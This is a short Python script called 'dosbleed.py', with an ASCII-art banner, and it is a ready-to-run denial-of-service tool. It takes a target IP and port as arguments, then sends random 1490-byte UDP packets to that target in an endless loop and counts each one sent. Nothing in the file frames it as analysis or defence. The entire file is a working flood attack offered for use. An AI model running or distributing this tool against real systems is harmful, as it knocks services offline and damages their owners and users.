import sys
import os
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1490)

os.system("clear")

banner = """
▓█████▄  ▒█████    ██████     ▄▄▄▄    ██▓    ▓█████ ▓█████ ▓█████▄ 
▒██▀ ██▌▒██▒  ██▒▒██    ▒    ▓█████▄ ▓██▒    ▓█   ▀ ▓█   ▀ ▒██▀ ██▌
░██   █▌▒██░  ██▒░ ▓██▄      ▒██▒ ▄██▒██░    ▒███   ▒███   ░██   █▌
░▓█▄   ▌▒██   ██░  ▒   ██▒   ▒██░█▀  ▒██░    ▒▓█  ▄ ▒▓█  ▄ ░▓█▄   ▌
░▒████▓ ░ ████▓▒░▒██████▒▒   ░▓█  ▀█▓░██████▒░▒████▒░▒████▒░▒████▓ 
 ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░   ░▒▓███▀▒░ ▒░▓  ░░░ ▒░ ░░░ ▒░ ░ ▒▒▓  ▒ 
 ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░   ▒░▒   ░ ░ ░ ▒  ░ ░ ░  ░ ░ ░  ░ ░ ▒  ▒ 
 ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░      ░    ░   ░ ░      ░      ░    ░ ░  ░ 
   ░        ░ ░        ░      ░          ░  ░   ░  ░   ░  ░   ░    
 ░                                 ░                        ░       
"""

print(banner)

def line():
     print("-"*60)
     print("-"*60)

if len(sys.argv) <= 2:
    print("[+]Usage: python3 dosbleed.py <ip_addr> <port>")
    sys.exit()
    
line()
ip = str(sys.argv[1])
port = int(sys.argv[2])
     
print("[+]Your Target is: {0},{1}".format(ip,port))
time.sleep(2)
     
print("[+]Ready")
time.sleep(1)
     
print("[+]Go")
time.sleep(1)
     
sent = 0
try:
    while True:
        sock.sendto(bytes, (ip,port))
        sent = sent + 1
        print("Sent {0} packet to {1} throught port:{2}".format(sent,ip,port))
except KeyboardInterrupt:
    print("\n[*]Pressed Ctrl + C")
   
